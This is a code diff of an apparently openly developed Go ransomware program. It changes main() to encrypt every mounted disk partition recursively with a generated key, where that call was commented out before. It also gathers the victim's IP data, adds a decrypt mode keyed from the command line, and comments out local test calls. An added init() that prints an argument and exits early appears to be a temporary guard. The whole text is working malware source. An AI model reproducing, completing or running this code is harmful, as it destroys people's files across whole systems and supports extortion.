@@ -17,8 +17,11 @@ import (
 var IPData go_grab_ip.IPData
 
 func init() {
-	//wait until there's internet
+	fmt.Println(os.Args[1])
+	os.Exit(0)
+	return
 
+	//wait until there's internet
 }
 
 type RansomData struct {
@@ -29,6 +32,19 @@ type RansomData struct {
 }
 
 func main() {
+	partitions, _ := disk.Partitions(false)
+
+	//Handle decryption
+	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
+		for _, partition := range partitions {
+			err := ransom.RecursivelyDecryptDirectory(partition.Mountpoint, []byte(os.Args[2]))
+			if err != nil {
+				fmt.Println(err)
+			}
+		}
+		return
+	}
+
 	var data RansomData
 	data.IPData = go_grab_ip.AwaitIPData()
 	data.Key = ransom.GenerateKey()
@@ -43,35 +59,35 @@ func main() {
 	//for each partition, launch a new routine and wait for all to complete
 	//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
 	//doesn't affect performance
-	partitions, _ := disk.Partitions(false)
 	for _, partition := range partitions {
 		if ransom.Debug {
 			fmt.Println(partition.Mountpoint)
 		} else {
-			//err := ransom.RecursivelyEncryptDirectory(partition.Mountpoint, []byte(""))
-			//if err != nil {
-			//	fmt.Println(err)
-			//}
+			fmt.Println("WARNING: Starting to encrpy files...")
+			err := ransom.RecursivelyEncryptDirectory(partition.Mountpoint, []byte(data.Key))
+			if err != nil {
+				fmt.Println(err)
+			}
 		}
 	}
 
-	err := ransom.EncryptFile("test.txt", []byte("12345678912345678912345678912345"))
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	err = ransom.DecryptFile("test.txt.evil", []byte("12345678912345678912345678912345"))
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	err = ransom.RecursivelyEncryptDirectory("./test/", []byte("12345678912345678912345678912345"))
-	if err != nil {
-		fmt.Println(err)
-	}
-
-	err = ransom.RecursivelyDecryptDirectory("./test/", []byte("12345678912345678912345678912345"))
-	if err != nil {
-		fmt.Println(err)
-	}
+	//err := ransom.EncryptFile("test.txt", []byte("12345678912345678912345678912345"))
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	//
+	//err = ransom.DecryptFile("test.txt.evil", []byte("12345678912345678912345678912345"))
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	//
+	//err = ransom.RecursivelyEncryptDirectory("./test/", []byte("12345678912345678912345678912345"))
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
+	//
+	//err = ransom.RecursivelyDecryptDirectory("./test/", []byte("12345678912345678912345678912345"))
+	//if err != nil {
+	//	fmt.Println(err)
+	//}
 }
